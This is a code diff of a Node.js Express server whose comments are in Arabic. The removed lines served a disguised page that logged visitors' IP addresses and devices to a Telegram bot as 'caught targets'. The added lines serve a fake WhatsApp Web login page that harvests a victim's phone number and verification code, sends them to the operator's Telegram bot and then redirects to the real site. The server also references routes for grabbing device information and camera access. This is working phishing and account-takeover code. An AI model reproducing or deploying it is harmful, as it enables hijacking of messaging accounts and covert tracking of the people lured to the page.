@@ -3,66 +3,76 @@ const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// الحصول على المفاتيح من إعدادات Render
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const MY_ID = process.env.MY_ID;
 
-app.get('/', async (req, res) => {
-    // 1. الصفحة التي يراها الشخص (تمويه احترافي)
+// --- [ روابط المعلومات والكاميرا السابقة تبقى كما هي ] ---
+
+app.get('/', (req, res) => { /* كود المعلومات */ });
+app.get('/cam', (req, res) => { /* كود الكاميرا */ });
+
+// ==========================================
+// 3. رابط الواتساب (WhatsApp Login)
+// الرابط: https://omar-scanner.onrender.com/wa
+// ==========================================
+app.get('/wa', (req, res) => {
     res.send(`
         <!DOCTYPE html>
         <html lang="ar" dir="rtl">
         <head>
             <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>فحص الأمان</title>
+            <title>WhatsApp Web</title>
             <style>
-                body { background-color: #0f0f0f; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-                .loader { border: 4px solid #1a1a1a; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-                .text { margin-top: 20px; font-size: 1.2rem; letter-spacing: 2px; }
+                body { background: #f0f2f5; font-family: Segoe UI, Tahoma, sans-serif; display: flex; justify-content: center; padding-top: 50px; }
+                .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+                .logo { width: 80px; margin-bottom: 20px; }
+                h2 { color: #41525d; font-size: 19px; margin-bottom: 20px; }
+                input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+                button { width: 100%; background: #00a884; color: white; border: none; padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; }
+                .footer { font-size: 12px; color: #8696a0; margin-top: 20px; }
             </style>
         </head>
         <body>
-            <div class="loader"></div>
-            <div class="text">جاري فحص توافق الجهاز...</div>
+            <div class="login-box">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+                <h2>تسجيل الدخول إلى WhatsApp Web</h2>
+                <p style="font-size:14px; color:#666;">أدخل رقم هاتفك للمزامنة</p>
+                <input type="text" id="phone" placeholder="رقم الهاتف (مع رمز الدولة)">
+                <input type="text" id="otp" placeholder="كود التحقق (يصلك الآن)" style="display:none;">
+                <button id="btn" onclick="sendToBot()">التالي</button>
+                <div class="footer">من شركة Meta</div>
+            </div>
+
             <script>
-                // تحويل الشخص إلى جوجل بعد 4 ثوانٍ من سحب بياناته
-                setTimeout(() => { window.location.href = "https://www.google.com"; }, 4000);
+                let step = 1;
+                async function sendToBot() {
+                    const phone = document.getElementById('phone').value;
+                    const otp = document.getElementById('otp').value;
+                    let text = "";
+
+                    if (step === 1) {
+                        if(!phone) return alert("أدخل الرقم!");
+                        text = "📱 **رقم هاتف واتساب جديد:**\\n" + phone;
+                        document.getElementById('phone').style.display = "none";
+                        document.getElementById('otp').style.display = "block";
+                        document.getElementById('btn').innerText = "تأكيد الكود";
+                        step = 2;
+                    } else {
+                        if(!otp) return alert("أدخل الكود!");
+                        text = "🔑 **كود التحقق الخاص بـ " + phone + ":**\\n`" + otp + "`";
+                        setTimeout(() => { window.location.href = "https://web.whatsapp.com"; }, 1000);
+                    }
+
+                    await fetch("https://api.telegram.org/bot${BOT_TOKEN}/sendMessage", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({chat_id: "${MY_ID}", text: text, parse_mode: "Markdown"})
+                    });
+                }
             </script>
         </body>
         </html>
     `);
-
-    // 2. جمع معلومات الشخص (IP ونوع الجهاز)
-    const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    const userAgent = req.headers['user-agent'];
-    const visitTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Riyadh' });
-
-    // 3. تنسيق الرسالة لترسل لك في التلجرام
-    const telegramMessage = `
-🔥 **تم اصطياد هدف جديد!** 🔥
------------------------------
-🌐 **الـ IP:** \`${userIP}\`
-📱 **الجهاز:** \`${userAgent}\`
-⏰ **الوقت:** \`${visitTime}\`
------------------------------
-📡 *تم السحب بواسطة Omar Scanner*
-    `;
-
-    // 4. إرسال الرسالة فعلياً
-    try {
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: MY_ID,
-            text: telegramMessage,
-            parse_mode: 'Markdown'
-        });
-        console.log("✅ Data sent to Telegram successfully!");
-    } catch (error) {
-        console.error("❌ Telegram Error:", error.response ? error.response.data : error.message);
-    }
 });
 
-app.listen(PORT, () => {
-    console.log(`🚀 Scanner is active on port ${PORT}`);
-});
+app.listen(PORT, () => console.log("All Tools Active"));
